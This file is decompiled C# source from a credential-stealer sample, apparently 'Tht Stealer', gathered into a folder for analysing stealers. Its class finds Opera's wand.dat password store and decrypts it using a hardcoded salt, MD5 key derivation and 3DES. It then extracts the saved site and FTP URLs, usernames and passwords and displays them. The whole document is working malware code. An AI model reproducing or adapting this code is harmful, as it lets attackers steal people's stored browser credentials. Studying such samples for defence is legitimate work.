// Decompiled with JetBrains decompiler
// Type: operaa
// Assembly: winlogan.exe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 318DE2DF-1405-4E2E-8CC4-399298931BFA
// Assembly location: C:\Users\ZetSving\Desktop\На разбор Стиллеров\Tht Stealer\Tht Stealer\stub.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

internal class operaa
{
  private static byte[] opera_salt = new byte[11]
  {
    (byte) 131,
    (byte) 125,
    (byte) 252,
    (byte) 15,
    (byte) 142,
    (byte) 179,
    (byte) 232,
    (byte) 105,
    (byte) 115,
    (byte) 175,
    byte.MaxValue
  };
  private static byte[] key_size = new byte[4]
  {
    (byte) 0,
    (byte) 0,
    (byte) 0,
    (byte) 8
  };
  private static string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  public string DOutput;
  private int c;
  private int c1;
  private bool firstrun;
  private string ReturnValue;
  private string sUrlTemp;
  private string sUserTemp;
  private string sPassTemp;
  private string[] sUrl;
  private string[] sUser;
  private string[] sPass;
  private int lasturl;
  private bool ftp;

  public operaa()
  {
    this.c = 0;
    this.c1 = 0;
    this.firstrun = true;
    this.sUrl = new string[1001];
    this.sUser = new string[1001];
    this.sPass = new string[1001];
    this.lasturl = 0;
    this.ftp = false;
  }

  public object GetOpera()
  {
    if (File.Exists(operaa.path + "\\Opera\\Opera\\wand.dat"))
    {
      operaa.path = operaa.path + "\\Opera\\Opera\\wand.dat";
      this.version2();
    }
    else if (File.Exists(operaa.path + "\\Opera\\Opera\\profile\\wand.dat"))
    {
      operaa.path = operaa.path + "\\Opera\\Opera\\profile\\wand.dat";
      this.version2();
    }
    object obj;
    return obj;
  }

  private void version2()
  {
    try
    {
      byte[] numArray = File.ReadAllBytes(operaa.path);
      int num1 = 0;
      int num2 = checked (numArray.Length - 5);
      int index1 = num1;
      while (index1 <= num2)
      {
        if ((int) numArray[index1] == 0 && (int) numArray[checked (index1 + 1)] == 0 && ((int) numArray[checked (index1 + 2)] == 0 && (int) numArray[checked (index1 + 3)] == 8))
        {
          int num3 = (int) numArray[checked (index1 + 15)];
          byte[] key = new byte[8];
          byte[] encrypt_data = new byte[checked (num3 - 1 + 1)];
          Array.Copy((Array) numArray, checked (index1 + 4), (Array) key, 0, key.Length);
          Array.Copy((Array) numArray, checked (index1 + 16), (Array) encrypt_data, 0, encrypt_data.Length);
          this.DOutput = Conversions.ToString(Operators.AddObject((object) this.DOutput, Operators.ConcatenateObject(this.decrypt2_method(key, encrypt_data), (object) "\r\n")));
          checked { index1 += 11 + num3; }
        }
        checked { ++index1; }
      }
      string[] strArray = this.DOutput.Split(Conversions.ToChar(Environment.NewLine));
      int index2 = 0;
      do
      {
        strArray[index2] = (string) null;
        checked { ++index2; }
      }
      while (index2 <= 3);
      int num4 = 0;
      int num5 = checked (strArray.Length - 1);
      int index3 = num4;
      while (index3 <= num5)
      {
        this.sUrlTemp = (string) null;
        this.sUserTemp = (string) null;
        this.sPassTemp = (string) null;
        this.c = 0;
        try
        {
          if (strArray[index3].Contains("http://"))
          {
            if (index3 != 0)
            {
              try
              {
                int num3 = 0;
                int num6 = checked (strArray[index3].Length - 1);
                int num7 = num3;
                while (num7 <= num6)
                {
                  if ((int) strArray[index3][checked (num7 - this.c)] > (int) sbyte.MaxValue)
                  {
                    strArray[index3] = strArray[index3].Remove(checked (num7 - this.c), 1);
                    this.c = checked (this.c + 1);
                  }
                  checked { ++num7; }
                }
                if (checked (index3 - this.lasturl) == 1)
                  this.sUrlTemp = strArray[index3];
                else if (checked (index3 - this.lasturl) == 2)
                  this.sUrlTemp = strArray[index3];
                this.lasturl = index3;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
          }
          else if (strArray[index3].Contains("https://"))
          {
            if (index3 != 0)
            {
              try
              {
                int num3 = 0;
                int num6 = checked (strArray[index3].Length - 1);
                int num7 = num3;
                while (num7 <= num6)
                {
                  if ((int) strArray[index3][checked (num7 - this.c)] > (int) sbyte.MaxValue)
                  {
                    strArray[index3] = strArray[index3].Remove(checked (num7 - this.c), 1);
                    this.c = checked (this.c + 1);
                  }
                  checked { ++num7; }
                }
                if (checked (index3 - this.lasturl) == 1)
                  this.sUrlTemp = strArray[index3];
                else if (checked (index3 - this.lasturl) == 2)
                  this.sUrlTemp = strArray[index3];
                this.lasturl = index3;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
          }
          else if (strArray[index3].Contains("ftp://"))
          {
            if (index3 != 0)
            {
              this.ftp = true;
              try
              {
                int num3 = 0;
                int num6 = checked (strArray[index3].Length - 1);
                int num7 = num3;
                while (num7 <= num6)
                {
                  if ((int) strArray[index3][checked (num7 - this.c)] > (int) sbyte.MaxValue)
                  {
                    strArray[index3] = strArray[index3].Remove(checked (num7 - this.c), 1);
                    this.c = checked (this.c + 1);
                  }
                  checked { ++num7; }
                }
                this.sUrlTemp = strArray[index3];
                this.lasturl = index3;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
          }
          else if (this.ftp)
          {
            if (checked (index3 - this.lasturl) == 1)
            {
              try
              {
                int num3 = 0;
                int num6 = checked (strArray[index3].Length - 1);
                int num7 = num3;
                while (num7 <= num6)
                {
                  if ((int) strArray[index3][checked (num7 - this.c)] > (int) sbyte.MaxValue)
                  {
                    strArray[index3] = strArray[index3].Remove(checked (num7 - this.c), 1);
                    this.c = checked (this.c + 1);
                  }
                  checked { ++num7; }
                }
                this.sUserTemp = strArray[index3];
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else if (checked (index3 - this.lasturl) == 2)
            {
              try
              {
                int num3 = 0;
                int num6 = checked (strArray[index3].Length - 1);
                int num7 = num3;
                while (num7 <= num6)
                {
                  if ((int) strArray[index3][checked (num7 - this.c)] > (int) sbyte.MaxValue)
                  {
                    strArray[index3] = strArray[index3].Remove(checked (num7 - this.c), 1);
                    this.c = checked (this.c + 1);
                  }
                  checked { ++num7; }
                }
                this.sPassTemp = strArray[index3];
                this.c1 = checked (this.c1 + 1);
                this.ftp = false;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
          }
          else if (this.lasturl != 0)
          {
            if (index3 == checked (this.lasturl + 2))
            {
              try
              {
                int num3 = 0;
                int num6 = checked (strArray[index3].Length - 1);
                int num7 = num3;
                while (num7 <= num6)
                {
                  if ((int) strArray[index3][checked (num7 - this.c)] > (int) sbyte.MaxValue)
                  {
                    strArray[index3] = strArray[index3].Remove(checked (num7 - this.c), 1);
                    this.c = checked (this.c + 1);
                  }
                  checked { ++num7; }
                }
                this.sUserTemp = strArray[index3];
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else if (index3 == checked (this.lasturl + 4))
            {
              try
              {
                int num3 = 0;
                int num6 = checked (strArray[index3].Length - 1);
                int num7 = num3;
                while (num7 <= num6)
                {
                  if ((int) strArray[index3][checked (num7 - this.c)] > (int) sbyte.MaxValue)
                  {
                    strArray[index3] = strArray[index3].Remove(checked (num7 - this.c), 1);
                    this.c = checked (this.c + 1);
                  }
                  checked { ++num7; }
                }
                this.sPassTemp = strArray[index3];
                this.c1 = checked (this.c1 + 1);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          if (Operators.CompareString(this.sUrlTemp, (string) null, false) != 0)
            this.sUrl[this.c1] = this.sUrlTemp;
          if (Operators.CompareString(this.sUserTemp, (string) null, false) != 0)
            this.sUser[this.c1] = this.sUserTemp;
          if (Operators.CompareString(this.sPassTemp, (string) null, false) != 0)
          {
            try
            {
              this.sPass[checked (this.c1 - 1)] = this.sPassTemp;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index3; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Console.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
    int num = 0;
    int length = this.sUrl.Length;
    int index = num;
    while (index <= length && Operators.CompareString(this.sUrl[index], "", false) != 0)
    {
      MyProject.Forms.Form1.operat.Text = "Host: " + this.sUrl[index] + "\r\nUsername: " + this.sUser[index] + "\r\nPassword: " + this.sPass[index];
      checked { ++index; }
    }
  }

  public object decrypt2_method(byte[] key, byte[] encrypt_data)
  {
    object obj;
    try
    {
      MD5CryptoServiceProvider cryptoServiceProvider1 = new MD5CryptoServiceProvider();
      cryptoServiceProvider1.Initialize();
      byte[] buffer1 = new byte[checked (operaa.opera_salt.Length + (key.Length - 1) + 1)];
      Array.Copy((Array) operaa.opera_salt, (Array) buffer1, operaa.opera_salt.Length);
      Array.Copy((Array) key, 0, (Array) buffer1, operaa.opera_salt.Length, key.Length);
      byte[] hash1 = cryptoServiceProvider1.ComputeHash(buffer1);
      byte[] buffer2 = new byte[checked (hash1.Length + operaa.opera_salt.Length + (key.Length - 1) + 1)];
      Array.Copy((Array) hash1, (Array) buffer2, hash1.Length);
      Array.Copy((Array) operaa.opera_salt, 0, (Array) buffer2, hash1.Length, operaa.opera_salt.Length);
      Array.Copy((Array) key, 0, (Array) buffer2, checked (hash1.Length + operaa.opera_salt.Length), key.Length);
      byte[] hash2 = cryptoServiceProvider1.ComputeHash(buffer2);
      TripleDESCryptoServiceProvider cryptoServiceProvider2 = new TripleDESCryptoServiceProvider();
      cryptoServiceProvider2.Mode = CipherMode.CBC;
      cryptoServiceProvider2.Padding = PaddingMode.None;
      byte[] numArray1 = new byte[24];
      byte[] numArray2 = new byte[8];
      Array.Copy((Array) hash1, (Array) numArray1, hash1.Length);
      Array.Copy((Array) hash2, 0, (Array) numArray1, hash1.Length, 8);
      Array.Copy((Array) hash2, 8, (Array) numArray2, 0, 8);
      cryptoServiceProvider2.Key = numArray1;
      cryptoServiceProvider2.IV = numArray2;
      obj = (object) Encoding.Unicode.GetString(cryptoServiceProvider2.CreateDecryptor().TransformFinalBlock(encrypt_data, 0, encrypt_data.Length));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      obj = (object) "";
      ProjectData.ClearProjectError();
    }
    return obj;
  }
}
